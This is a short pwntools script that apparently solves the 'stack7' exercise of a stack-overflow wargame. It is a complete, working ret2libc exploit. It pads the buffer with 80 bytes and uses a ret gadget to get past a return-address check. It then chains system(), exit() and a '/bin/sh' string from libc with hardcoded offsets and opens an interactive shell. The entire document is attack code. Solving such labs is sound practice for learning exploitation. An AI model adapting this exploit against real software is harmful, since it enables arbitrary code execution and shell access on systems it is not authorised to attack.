from pwn import *

elf = ELF('./stack7')
p = process(elf.path)

libc_base = 0xf7d60000
binsh_offset = 0x1c6e52  # offset from libc base

ret_addr = 0x08048544  # getpath() ret
string_addr = libc_base + binsh_offset
system_addr = libc_base + 0x52220  # system offset from libc base
exit_addr = libc_base + 0x3ead0  # exit offset from libc base

payload = flat(
    b'A' * 80,
    ret_addr,
    system_addr,
    exit_addr,
    string_addr
)

p.sendlineafter(b'input path please: ', payload)
p.interactive()
